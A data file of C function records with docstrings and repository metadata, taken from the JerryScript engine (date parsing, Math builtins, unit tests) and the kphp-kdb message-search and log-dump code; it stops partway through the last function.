{"docstring": "/**\n * Helper function used by ecma_builtin_date_parse\n *\n * See also:\n *          ECMA-262 v5, 15.9.4.2  Date.parse (string)\n *          ECMA-262 v9, 20.3.4.41 Date.prototype.toString ()\n *          ECMA-262 v9, 20.3.4.43 Date.prototype.toUTCString ()\n *\n * Used by: ecma_builtin_date_parse\n *\n * @return the parsed date as ecma_number_t or NaN otherwise\n */\n", "func_signal": "static ecma_number_t\necma_builtin_date_parse_toString_formats (const lit_utf8_byte_t *date_str_curr_p,\n                                          const lit_utf8_byte_t *date_str_end_p)", "code": "{\n  const ecma_number_t nan = ecma_number_make_nan ();\n\n  if (!ecma_date_parse_day_name (&date_str_curr_p, date_str_end_p))\n  {\n    return nan;\n  }\n\n  const bool is_toUTCString_format = ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ',');\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n  {\n    return nan;\n  }\n\n  ecma_number_t month = 0;\n  ecma_number_t day = 0;\n  if (is_toUTCString_format)\n  {\n    day = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 31);\n    if (ecma_number_is_nan (day))\n    {\n      return nan;\n    }\n\n    if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n    {\n      return nan;\n    }\n\n    month = ecma_date_parse_month_name (&date_str_curr_p, date_str_end_p);\n    if (!(int) month)\n    {\n      return nan;\n    }\n  }\n  else\n  {\n    month = ecma_date_parse_month_name (&date_str_curr_p, date_str_end_p);\n    if (!(int) month)\n    {\n      return nan;\n    }\n\n    if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n    {\n      return nan;\n    }\n\n    day = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 31);\n    if (ecma_number_is_nan (day))\n    {\n      return nan;\n    }\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n  {\n    return nan;\n  }\n\n  ecma_number_t year = ecma_date_parse_year (&date_str_curr_p, date_str_end_p);\n  if (ecma_number_is_nan (year))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n  {\n    return nan;\n  }\n\n  ecma_number_t hours = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 24);\n  if (ecma_number_is_nan (hours))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ':'))\n  {\n    return nan;\n  }\n\n  ecma_number_t minutes = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n  if (ecma_number_is_nan (minutes))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ':'))\n  {\n    return nan;\n  }\n\n  ecma_number_t seconds = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n  if (ecma_number_is_nan (seconds))\n  {\n    return nan;\n  }\n\n  if (hours == 24 && (minutes != 0 || seconds != 0))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ' '))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, 'G'))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, 'M'))\n  {\n    return nan;\n  }\n\n  if (!ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, 'T'))\n  {\n    return nan;\n  }\n\n  ecma_number_t time = ecma_date_make_time (hours, minutes, seconds, 0);\n\n  if (!is_toUTCString_format)\n  {\n    bool is_timezone_sign_negative = ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '-');\n    if (!is_timezone_sign_negative && !ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '+'))\n    {\n      return nan;\n    }\n\n    hours = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 24);\n    if (ecma_number_is_nan (hours))\n    {\n      return nan;\n    }\n    if (hours == 24)\n    {\n      hours = ECMA_NUMBER_ZERO;\n    }\n\n    minutes = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n    if (ecma_number_is_nan (minutes))\n    {\n      return nan;\n    }\n\n    ecma_number_t timezone_offset = ecma_date_make_time (hours, minutes, ECMA_NUMBER_ZERO, ECMA_NUMBER_ZERO);\n    time += is_timezone_sign_negative ? timezone_offset : -timezone_offset;\n  }\n\n  if (date_str_curr_p >= date_str_end_p)\n  {\n    ecma_number_t date = ecma_date_make_day (year, month - 1, day);\n    return ecma_date_make_date (date, time);\n  }\n\n  return nan;\n}", "path": "jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-date.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/**\n * Helper function used by ecma_builtin_date_parse\n *\n * See also:\n *          ECMA-262 v5, 15.9.4.2  Date.parse (string)\n *          ECMA-262 v5, 15.9.1.15 Date Time String Format\n *\n * @return the parsed date as ecma_number_t or NaN otherwise\n */\n", "func_signal": "static ecma_number_t\necma_builtin_date_parse_ISO_string_format (const lit_utf8_byte_t *date_str_curr_p,\n                                           const lit_utf8_byte_t *date_str_end_p)", "code": "{\n  /* 1. read year */\n\n  uint32_t year_digits = 4;\n\n  bool is_year_sign_negative = ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '-');\n  if (is_year_sign_negative || ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '+'))\n  {\n    year_digits = 6;\n  }\n\n  ecma_number_t year = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, year_digits,\n                                                   0, (year_digits == 4) ? 9999 : 999999);\n  if (is_year_sign_negative)\n  {\n    year = -year;\n  }\n\n  if (!ecma_number_is_nan (year))\n  {\n    ecma_number_t month = ECMA_NUMBER_ONE;\n    ecma_number_t day = ECMA_NUMBER_ONE;\n    ecma_number_t time = ECMA_NUMBER_ZERO;\n\n    /* 2. read month if any */\n    if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '-'))\n    {\n      month = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 1, 12);\n    }\n\n    /* 3. read day if any */\n    if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '-'))\n    {\n      day = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 1, 31);\n    }\n\n    bool is_utc = true;\n    /* 4. read time if any */\n    if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, 'T'))\n    {\n      ecma_number_t hours = ECMA_NUMBER_ZERO;\n      ecma_number_t minutes = ECMA_NUMBER_ZERO;\n      ecma_number_t seconds = ECMA_NUMBER_ZERO;\n      ecma_number_t milliseconds = ECMA_NUMBER_ZERO;\n\n      lit_utf8_size_t remaining_length = lit_utf8_string_length (date_str_curr_p,\n                                                                 (lit_utf8_size_t) (date_str_end_p - date_str_curr_p));\n\n      if (remaining_length >= 5)\n      {\n        /* 4.1 read hours and minutes */\n        hours = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 24);\n\n        if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ':'))\n        {\n          minutes = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n\n          /* 4.2 read seconds if any */\n          if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ':'))\n          {\n            seconds = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n\n            /* 4.3 read milliseconds if any */\n            if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '.'))\n            {\n              milliseconds = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 3, 0, 999);\n            }\n          }\n        }\n        else\n        {\n          minutes = ecma_number_make_nan ();\n        }\n\n        if (hours == 24 && (minutes != 0 || seconds != 0 || milliseconds != 0))\n        {\n          hours = ecma_number_make_nan ();\n        }\n\n        time = ecma_date_make_time (hours, minutes, seconds, milliseconds);\n      }\n      else\n      {\n        time = ecma_number_make_nan ();\n      }\n\n      /* 4.4 read timezone if any */\n      if (ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, 'Z') && !ecma_number_is_nan (time))\n      {\n        time = ecma_date_make_time (hours, minutes, seconds, milliseconds);\n      }\n      else\n      {\n        bool is_timezone_sign_negative;\n        if ((lit_utf8_string_length (date_str_curr_p, (lit_utf8_size_t) (date_str_end_p - date_str_curr_p)) == 6)\n            && ((is_timezone_sign_negative = ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '-'))\n            || ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, '+')))\n        {\n          /* read hours and minutes */\n          hours = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 24);\n\n          if (hours == 24)\n          {\n            hours = ECMA_NUMBER_ZERO;\n          }\n\n          ecma_date_parse_special_char (&date_str_curr_p, date_str_end_p, ':');\n          minutes = ecma_date_parse_date_chars (&date_str_curr_p, date_str_end_p, 2, 0, 59);\n          ecma_number_t timezone_offset = ecma_date_make_time (hours, minutes, ECMA_NUMBER_ZERO, ECMA_NUMBER_ZERO);\n          time += is_timezone_sign_negative ? timezone_offset : -timezone_offset;\n        }\n        else\n        {\n          is_utc = false;\n        }\n      }\n    }\n\n    if (date_str_curr_p >= date_str_end_p)\n    {\n      ecma_number_t date = ecma_date_make_day (year, month - 1, day);\n\n      ecma_number_t result_date = ecma_date_make_date (date, time);\n      if (!is_utc)\n      {\n        result_date = ecma_date_utc (result_date);\n      }\n\n      return result_date;\n    }\n  }\n  return ecma_number_make_nan ();\n}", "path": "jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-date.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_context_data2_new */\n", "func_signal": "static void\ntest_context_data2_free (void *user_data_p)", "code": "{\n  test_context_data2_free_called = true;\n  TEST_ASSERT ((*(const char **) user_data_p) == string2);\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* create_object */\n", "func_signal": "static void\ntest_handle_scope_val (void)", "code": "{\n  jerryx_handle_scope scope;\n  jerryx_open_handle_scope (&scope);\n  jerry_value_t obj = create_object ();\n  (void) obj;\n\n  jerry_gc (JERRY_GC_PRESSURE_LOW);\n  TEST_ASSERT (native_free_cb_call_count == (handle_count -1));\n\n  jerryx_close_handle_scope (scope);\n}", "path": "jerryscript/tests/unit-ext/test-ext-handle-scope-handle-prelist.c", "commit_date": "2019-07-17 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* !ENABLE_INIT_FINI */\n", "func_signal": "int\nmain (int argc, char **argv)", "code": "{\n  (void) argc;\n  (void) argv;\n  jerry_value_t js_global = 0, js_function = 0, js_property_name = 0;\n  jerry_value_t res;\n\n#ifndef ENABLE_INIT_FINI\n  my_broken_module_register ();\n  my_custom_module_register ();\n#endif /* !ENABLE_INIT_FINI */\n\n  jerry_init (JERRY_INIT_EMPTY);\n\n  js_global = jerry_get_global_object ();\n\n  js_function = jerry_create_external_function (handle_require);\n  js_property_name = jerry_create_string ((const jerry_char_t *) \"require\");\n  res = jerry_set_property (js_global, js_property_name, js_function);\n  TEST_ASSERT (!jerry_value_is_error (res));\n  TEST_ASSERT (jerry_value_is_boolean (res) && jerry_get_boolean_value (res));\n  jerry_release_value (res);\n  jerry_release_value (js_property_name);\n  jerry_release_value (js_function);\n\n  js_function = jerry_create_external_function (handle_clear_require_cache);\n  js_property_name = jerry_create_string ((const jerry_char_t *) \"clear_require_cache\");\n  res = jerry_set_property (js_global, js_property_name, js_function);\n  TEST_ASSERT (!jerry_value_is_error (res));\n  TEST_ASSERT (jerry_value_is_boolean (res) && jerry_get_boolean_value (res));\n  jerry_release_value (res);\n  jerry_release_value (js_property_name);\n  jerry_release_value (js_function);\n\n  jerry_release_value (js_global);\n\n  eval_one (eval_string1, 42);\n  eval_one (eval_string2, 29);\n  eval_one (eval_string3, 1);\n  eval_one (eval_string4, 1);\n  eval_one (eval_string5, 1);\n  eval_one (eval_string6, 1);\n  eval_one (eval_string7, 1);\n\n  jerry_cleanup ();\n}", "path": "jerryscript/tests/unit-ext/module/jerry-module-test.c", "commit_date": "2019-08-06 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_instanceof */\n", "func_signal": "int\nmain (void)", "code": "{\n  jerry_init (JERRY_INIT_EMPTY);\n\n  jerry_value_t instanceof = jerry_eval ((jerry_char_t *) instanceof_source, sizeof (instanceof_source) - 1, true);\n\n  /* Test for a native-backed function. */\n  jerry_value_t constructor = jerry_create_external_function (external_function);\n\n  test_instanceof (instanceof, constructor);\n  jerry_release_value (constructor);\n\n  /* Test for a JS constructor. */\n  jerry_value_t global = jerry_get_global_object ();\n  jerry_value_t object_name = jerry_create_string ((jerry_char_t *) \"Object\");\n  constructor = jerry_get_property (global, object_name);\n  jerry_release_value (object_name);\n  jerry_release_value (global);\n\n  test_instanceof (instanceof, constructor);\n  jerry_release_value (constructor);\n\n  jerry_release_value (instanceof);\n\n  jerry_cleanup ();\n\n  return 0;\n}", "path": "jerryscript/tests/unit-core/test-native-instanceof.c", "commit_date": "2019-10-25 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_context_data4_new */\n", "func_signal": "static void\ntest_context_data4_free (void *user_data_p)", "code": "{\n  test_context_data4_free_called = true;\n  TEST_ASSERT (user_data_p == NULL);\n  TEST_ASSERT (!test_context_data4_finalize_called);\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_context_data4_free */\n", "func_signal": "static void\ntest_context_data4_finalize (void *user_data_p)", "code": "{\n  TEST_ASSERT (!test_context_data4_finalize_called);\n  test_context_data4_finalize_called = true;\n  TEST_ASSERT (user_data_p == NULL);\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/**\n * The Math object's 'sign' routine\n *\n * See also:\n *          ECMA-262 v6, 20.2.2.29\n *\n * @return ecma number\n */\n", "func_signal": "static ecma_number_t\necma_builtin_math_object_sign (ecma_number_t arg)", "code": "{\n  if (ecma_number_is_nan (arg) || ecma_number_is_zero (arg))\n  {\n    return arg;\n  }\n\n  if (ecma_number_is_negative (arg))\n  {\n    return (ecma_number_t) -1.0;\n  }\n\n  return (ecma_number_t) 1.0;\n}", "path": "jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-math.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* external_function */\n", "func_signal": "static void\ntest_instanceof (jerry_value_t instanceof,\n                 jerry_value_t constructor)", "code": "{\n  jerry_value_t instance = jerry_construct_object (constructor, NULL, 0);\n  jerry_value_t args[2] =\n  {\n    instance, constructor\n  };\n\n  jerry_value_t undefined = jerry_create_undefined ();\n  jerry_value_t result = jerry_call_function (instanceof, undefined, args, 2);\n  jerry_release_value (undefined);\n\n  TEST_ASSERT (!jerry_value_is_error (result));\n  TEST_ASSERT (jerry_value_is_boolean (result));\n\n  TEST_ASSERT (jerry_get_boolean_value (result));\n\n  jerry_release_value (instance);\n  jerry_release_value (result);\n}", "path": "jerryscript/tests/unit-core/test-native-instanceof.c", "commit_date": "2019-10-25 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/*\n * Define module \"cache-check\" via its own resolver as an empty object. Since objects are accessible only via references\n * we can strictly compare the object returned on subsequent attempts at loading \"cache-check\" with the object returned\n * on the first attempt and establish that the two are in fact the same object - which in turn shows that caching works.\n */\n", "func_signal": "static bool\ncache_check (const jerry_value_t name,\n             jerry_value_t *result)", "code": "{\n  jerry_size_t name_size = jerry_get_utf8_string_size (name);\n  JERRY_VLA (jerry_char_t, name_string, name_size);\n  jerry_string_to_utf8_char_buffer (name, name_string, name_size);\n\n  if (!strncmp ((char *) name_string, \"cache-check\", name_size))\n  {\n    (*result) = jerry_create_object ();\n    return true;\n  }\n  return false;\n}", "path": "jerryscript/tests/unit-ext/module/jerry-module-test.c", "commit_date": "2019-08-06 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* construct_handler */\n", "func_signal": "int\nmain (void)", "code": "{\n  /* Test JERRY_FEATURE_SYMBOL feature as it is a must-have in ES.next */\n  if (!jerry_is_feature_enabled (JERRY_FEATURE_SYMBOL))\n  {\n    jerry_port_log (JERRY_LOG_LEVEL_ERROR, \"Skipping test, ES.next support is disabled.\\n\");\n    return 0;\n  }\n\n  jerry_init (JERRY_INIT_EMPTY);\n\n  {\n    jerry_value_t global_obj_val = jerry_get_global_object ();\n\n    jerry_value_t function_val = jerry_create_external_function (construct_handler);\n    jerry_value_t function_name_val = jerry_create_string ((const jerry_char_t *) \"Demo\");\n    jerry_value_t result_val = jerry_set_property (global_obj_val, function_name_val, function_val);\n    TEST_ASSERT (!jerry_value_is_error (result_val));\n    TEST_ASSERT (jerry_get_boolean_value (result_val) == true);\n    jerry_release_value (result_val);\n    jerry_release_value (function_name_val);\n    jerry_release_value (global_obj_val);\n    jerry_release_value (function_val);\n  }\n\n  {\n    static const jerry_char_t test_source[] = TEST_STRING_LITERAL (\n        \"class Sub1 extends Demo { constructor () { super (1); } };\"\n        \"new Sub1 ()\"\n    );\n\n    jerry_value_t parsed_code_val = jerry_parse (NULL,\n                                                 0,\n                                                 test_source,\n                                                 sizeof (test_source) - 1,\n                                                 JERRY_PARSE_NO_OPTS);\n    TEST_ASSERT (!jerry_value_is_error (parsed_code_val));\n\n    jerry_value_t result = jerry_run (parsed_code_val);\n    TEST_ASSERT (!jerry_value_is_error (result));\n\n    jerry_release_value (result);\n    jerry_release_value (parsed_code_val);\n  }\n\n  {\n    static const jerry_char_t test_source[] = TEST_STRING_LITERAL (\n      \"class Sub2 extends Demo { };\"\n      \"new Sub2 (1)\"\n    );\n\n    jerry_value_t parsed_code_val = jerry_parse (NULL,\n                                                 0,\n                                                 test_source,\n                                                 sizeof (test_source) - 1,\n                                                 JERRY_PARSE_NO_OPTS);\n    TEST_ASSERT (!jerry_value_is_error (parsed_code_val));\n\n    jerry_value_t result = jerry_run (parsed_code_val);\n    TEST_ASSERT (!jerry_value_is_error (result));\n\n    jerry_release_value (result);\n    jerry_release_value (parsed_code_val);\n  }\n\n  jerry_cleanup ();\n  return 0;\n}", "path": "jerryscript/tests/unit-core/test-regression-3588.c", "commit_date": "2020-06-12 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* jerryx_native_module_register */\n", "func_signal": "void jerryx_native_module_unregister (jerryx_native_module_t *module_p)", "code": "{\n  jerryx_native_module_t *parent_p = NULL, *iter_p = NULL;\n\n  for (iter_p = first_module_p; iter_p != NULL; parent_p = iter_p, iter_p = iter_p->next_p)\n  {\n    if (iter_p == module_p)\n    {\n      if (parent_p)\n      {\n        parent_p->next_p = module_p->next_p;\n      }\n      else\n      {\n        first_module_p = module_p->next_p;\n      }\n      module_p->next_p = NULL;\n    }\n  }\n}", "path": "jerryscript/jerry-ext/module/module.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* Context item 3 */\n", "func_signal": "static void\ntest_context_data3_new (void *user_data_p)", "code": "{\n  JERRY_UNUSED (user_data_p);\n  test_context_data3_new_called = true;\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/**\n * Unit test's main function.\n */\n", "func_signal": "int\nmain (void)", "code": "{\n  TEST_INIT ();\n\n  const jerry_char_t *strings[] =\n  {\n    (const jerry_char_t *) \"1\",\n    (const jerry_char_t *) \"0.5\",\n    (const jerry_char_t *) \"12345\",\n    (const jerry_char_t *) \"1e-45\",\n    (const jerry_char_t *) \"-2.5e+38\",\n    (const jerry_char_t *) \"-2.5e38\",\n    (const jerry_char_t *) \"- 2.5e+38\",\n    (const jerry_char_t *) \"-2 .5e+38\",\n    (const jerry_char_t *) \"-2. 5e+38\",\n    (const jerry_char_t *) \"-2.5e+ 38\",\n    (const jerry_char_t *) \"-2.5 e+38\",\n    (const jerry_char_t *) \"-2.5e +38\",\n    (const jerry_char_t *) \"NaN\",\n    (const jerry_char_t *) \"abc\",\n    (const jerry_char_t *) \"   Infinity  \",\n    (const jerry_char_t *) \"-Infinity\",\n    (const jerry_char_t *) \"0\",\n    (const jerry_char_t *) \"0\",\n  };\n\n  const ecma_number_t nums[] =\n  {\n    (ecma_number_t) 1.0,\n    (ecma_number_t) 0.5,\n    (ecma_number_t) 12345.0,\n    (ecma_number_t) 1.0e-45,\n    (ecma_number_t) -2.5e+38,\n    (ecma_number_t) -2.5e+38,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) NAN,\n    (ecma_number_t) INFINITY,\n    (ecma_number_t) -INFINITY,\n    (ecma_number_t) +0.0,\n    (ecma_number_t) -0.0\n  };\n\n  for (uint32_t i = 0;\n       i < sizeof (nums) / sizeof (nums[0]);\n       i++)\n  {\n    ecma_number_t num = ecma_utf8_string_to_number (strings[i], lit_zt_utf8_string_size (strings[i]), 0);\n\n    if (num != nums[i]\n        && (!ecma_number_is_nan (num)\n            || !ecma_number_is_nan (nums[i])))\n    {\n      return 1;\n    }\n  }\n\n  return 0;\n}", "path": "jerryscript/tests/unit-core/test-string-to-number.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/**\n * The Math object's 'random' routine.\n *\n * See also:\n *          ECMA-262 v5, 15.8.2.14\n *\n * @return ecma value\n *         Returned value must be freed with ecma_free_value.\n */\n", "func_signal": "static ecma_value_t\necma_builtin_math_object_random (void)", "code": "{\n  const ecma_number_t rand_max = (ecma_number_t) RAND_MAX;\n  const ecma_number_t rand_max_min_1 = (ecma_number_t) (RAND_MAX - 1);\n\n  return ecma_make_number_value (((ecma_number_t) rand ()) / rand_max * rand_max_min_1 / rand_max);\n}", "path": "jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-math.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* user loaded OR cur_user=0,  UH points to dynamical data OR 0. */\n", "func_signal": "int do_combined_search (void)", "code": "{\n  message_t *M;\n  int prune_neg = 0, prune_pos = 0, first_neg = -0x7fffffff, first_pos = 0x7fffffff;\n    \n  ResL = 0;\n\n  prefetch_search_lists();\n\n  if (UH) {\n    for (M = UH->msgs; M; M = M->prev) {\n      if (M->message_id < 0 && M->message_id > first_neg) {\n\tfirst_neg = M->message_id;\n      }\n      if (M->message_id > 0 && M->message_id < first_pos) {\n\tfirst_pos = M->message_id;\n      }\n      if (search_in_msg (M->hashes, M->hc)) {\n\tResBuff[ResL++] = M->message_id;\n\tif (ResL >= MAX_INTERMEDIATE_SIZE) {\n\t  return ResL;\n\t}\n      }\n    }\n    prune_pos = UH->pos_to;\n    prune_neg = UH->neg_to;\n    if (verbosity > 0) {\n      fprintf (stderr, \"recent_search(): %d messages found\\n\", ResL);\n    }\n  }\n\n  ResR = ResL;\n  ResL = 0;\n  if (cur_user > 0) {\n    do_search (prune_pos, prune_neg, first_pos, first_neg);\n  }\n\n  ResL += ResR;\n  Res = ResBuff;\n\n  if (UH && UH->delmsg_cnt) {\n    int *A = UH->delmsg_list, *B = A + UH->delmsg_cnt - 1;\n    int i, j = 0, t;\n    if (verbosity > 0) {\n      fprintf (stderr, \"user has %d deleted messages %d %d %d ..., pruning\\n\", UH->delmsg_cnt, A[0], A[1], A[2]);\n    }\n    assert (A);\n    for (i = 0; i < ResL; i++) {\n      t = ResBuff[i];\n      if (t < 0) {\n\twhile (A <= B && *A < t) { A++; }\n\tif (A <= B && *A == t) {\n\t  A++;\n\t} else {\n\t  ResBuff[j++] = t;\n\t}\n      } else {\n\twhile (A <= B && *B > t) { B--; }\n\tif (A <= B && *B == t) {\n\t  B--;\n\t} else {\n\t  ResBuff[j++] = t;\n\t}\n      }\n    }\n    if (verbosity > 0) {\n      fprintf (stderr, \"pruned: resulting list contains %d, original %d\\n\", j, ResL);\n    }\n    ResL = j;\n  }\n  \n  return ResL;\n}", "path": "kphp-kdb/msg-search/msg-search-engine.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* file utils */\n", "func_signal": "int open_file (int x, char *fname, int creat)", "code": "{\n  fnames[x] = fname;\n  fd[x] = open (fname, creat > 0 ? O_RDWR | O_CREAT : O_RDONLY, 0600);\n  if (creat < 0 && fd[x] < 0) {\n    if (fd[x] < 0) {\n      fprintf (stderr, \"%s: cannot open %s: %m\\n\", progname, fname);\n    }\n    return -1;\n  }\n  if (fd[x] < 0) {\n    fprintf (stderr, \"%s: cannot open %s: %m\\n\", progname, fname);\n    exit(1);\n  }\n  fsize[x] = lseek (fd[x], 0, SEEK_END);\n  if (fsize[x] < 0) {\n    fprintf (stderr, \"%s: cannot seek %s: %m\\n\", progname, fname);\n    exit(2);\n  }\n  lseek (fd[x], 0, SEEK_SET);\n  if (verbosity) {\n    fprintf (stderr, \"opened file %s, fd=%d, size=%lld\\n\", fname, fd[x], fsize[x]);\n  }\n  return fd[x];\n}", "path": "kphp-kdb/msg-search/msg-search-engine.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\n * END MAIN\n */\n", "func_signal": "void output_stats (void)", "code": "{\n  fprintf (stderr,\n\t   \"read: %lld bytes (%ld remaining), %lld records\\n\"\n\t   \"written: %lld bytes, %lld records\\n\",\n\t   rd_bytes, (long)(rend - rptr), rd_rec, wr_bytes, wr_rec);\n}", "path": "kphp-kdb/targ/targ-log-merge.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/** return code:\n   -1: event dumping is unsupported\n    0: logevent has been dumped\n    1: logevent hasn't been dumped (ex. TIMESTAMP, CRC32)\n*/\n", "func_signal": "int dump_logevent (FILE *out, struct lev_generic *EE)", "code": "{\n  struct lev_new_entry_ext *E = (struct lev_new_entry_ext *)EE;\n  if (E->type == LEV_TIMESTAMP) {\n    update_timestamp(((struct lev_timestamp*) EE)->timestamp);\n    return 1;\n  }\n  if (E->type == LEV_CRC32) {\n    update_timestamp(((struct lev_crc32*) EE)->timestamp);\n    return 1;\n  }\n  if (! (min_utime <= cur_timestamp && cur_timestamp <= max_utime)) {\n    timeskipping_events++;\n    return 1;\n  }\n  if (human_readable_timestamp) {\n    time_t x = cur_timestamp;\n    strncpy(szTempTimeBuf,asctime(localtime(&x)),255);\n    szTempTimeBuf[255] = 0;\n    kill_newline(szTempTimeBuf);\n    fprintf(out, \"%s\\t\", szTempTimeBuf);\n  }\n  else {\n    fprintf(out, \"%d\\t\", cur_timestamp);\n  }\n  switch (E->type) {\n  case LEV_START:\n    fprintf(out, \"lev_start\\t%d\\t%d\\t%d\\t%d\\t%d\\t\",\n      ((struct lev_start*) EE)->schema_id /* %d:int */,\n      ((struct lev_start*) EE)->extra_bytes /* %d:int */,\n      ((struct lev_start*) EE)->split_mod /* %d:int */,\n      ((struct lev_start*) EE)->split_min /* %d:int */,\n      ((struct lev_start*) EE)->split_max /* %d:int */);\n    dump_char_list(out, ((struct lev_start*) EE)->str, 4);\n    fputc('\\n', out);\n    return 0;\n  case LEV_NOOP:\n    fprintf(out, \"lev_noop\\n\");\n    return 0;\n  case LEV_TIMESTAMP:\n    return 1;\n  case LEV_CRC32:\n    return 1;\n  case LEV_ROTATE_FROM:\n    fprintf(out, \"lev_rotate_from\\t%d\\t%lld\\t%llu\\t%llu\\n\",\n      ((struct lev_rotate_from*) EE)->timestamp /* %d:int */,\n      ((struct lev_rotate_from*) EE)->cur_log_pos /* %lld:long long */,\n      ((struct lev_rotate_from*) EE)->prev_log_hash /* %llu:hash_t */,\n      ((struct lev_rotate_from*) EE)->cur_log_hash /* %llu:hash_t */);\n    return 0;  \n  case 